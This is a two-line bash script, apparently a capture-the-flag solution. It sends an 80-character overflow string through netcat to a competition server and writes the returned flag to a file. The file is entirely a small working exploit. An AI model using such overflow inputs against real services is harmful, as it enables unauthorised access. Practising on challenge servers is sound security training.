#!/bin/bash
python -c "print('A' * 80)" | nc chall.csivit.com 30001 | tail -n 1 > flag.txt